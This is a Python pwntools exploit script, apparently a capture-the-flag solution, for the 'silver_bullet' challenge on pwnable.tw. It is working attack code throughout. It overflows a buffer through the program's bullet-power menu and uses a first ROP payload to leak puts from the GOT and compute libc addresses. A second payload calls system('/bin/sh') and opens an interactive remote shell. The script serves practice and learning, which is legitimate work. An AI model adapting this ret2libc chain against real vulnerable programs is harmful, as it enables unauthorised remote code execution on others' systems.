from pwn import *

local = 0

puts_plt = 0x080484a8
puts_got = 0x0804afdc
main = 0x08048954

if local:
	system_offset = 0x45830
	puts_offset = 0x71cd0
	bin_sh_offset = 0x192352
	s = process('./silver_bullet')
	raw_input('DEBUG')
else:
	system_offset = 0x3a940
	puts_offset = 0x5f140
	bin_sh_offset = 0x158e8b
	s = remote('chall.pwnable.tw', 10103)

# Part 1

s.sendlineafter(b'Your choice :', b'1')

s.sendafter(b'bullet :', b'A' * 0x2f)

s.sendlineafter(b'Your choice :', b'2')

s.sendlineafter(b'bullet :', b'A')

s.sendlineafter(b'Your choice :', b'2')

payload = p32(0xffffff41) + b'A' * 3 + p32(puts_plt) + p32(main) + p32(puts_got)

s.sendlineafter(b'bullet :', payload)

s.sendlineafter(b'Your choice :', b'3')

s.recvuntil(b'You win !!\n')

puts_leak = int.from_bytes(s.recvline().strip(), byteorder = 'little', signed = False)

libc_base = puts_leak - puts_offset
system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset

# Part 2

s.sendlineafter(b'Your choice :', b'1')

s.sendafter(b'bullet :', b'A' * 0x2f)

s.sendlineafter(b'Your choice :', b'2')

s.sendlineafter(b'bullet :', b'A')

s.sendlineafter(b'Your choice :', b'2')

payload = p32(0xffffff41) + b'A' * 3 + p32(system) + p32(0xffffffff) + p32(bin_sh)

s.sendlineafter(b'bullet :', payload)

s.sendlineafter(b'Your choice :', b'3')

s.interactive()
